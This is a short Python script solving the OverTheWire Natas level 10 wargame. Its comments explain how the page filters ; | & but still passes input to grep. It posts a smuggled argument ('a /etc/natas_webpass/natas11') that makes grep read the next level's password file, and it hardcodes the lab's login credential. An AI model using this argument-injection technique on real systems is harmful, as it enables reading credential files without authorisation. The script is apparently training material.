import requests as req
import re

"""In this lab we also have similer situation Like natas but here we have some dirreent condition as the response says 'For security reasons, we now filter on certain characters' 

If we use simmiler injection method as lab natas9 it returns us 'Input contains an illegal character!'
    So we need to try bypassing the filtering mechacinsm;

In the source code we have 
'
if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    }
'
It only checks if we have the characters ; | & in our input . If exists it returns us the error message or sends the input to `grep` command. 
It generally expects us a pattern to search in the file .
As we know we can specify multiple files to `grep` command  so we can use this technique to read the password file. 


"""

username="natas10"
password='t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu'

url="http://%s.natas.labs.overthewire.org/" % username

data={
    "needle":"a /etc/natas_webpass/natas11",
    "submit":"submit"
}

s=req.Session()
response=s.post(url,auth=(username,password),data=data)

print(re.findall("/etc/natas_webpass/natas11:(.*)",response.text)[0])


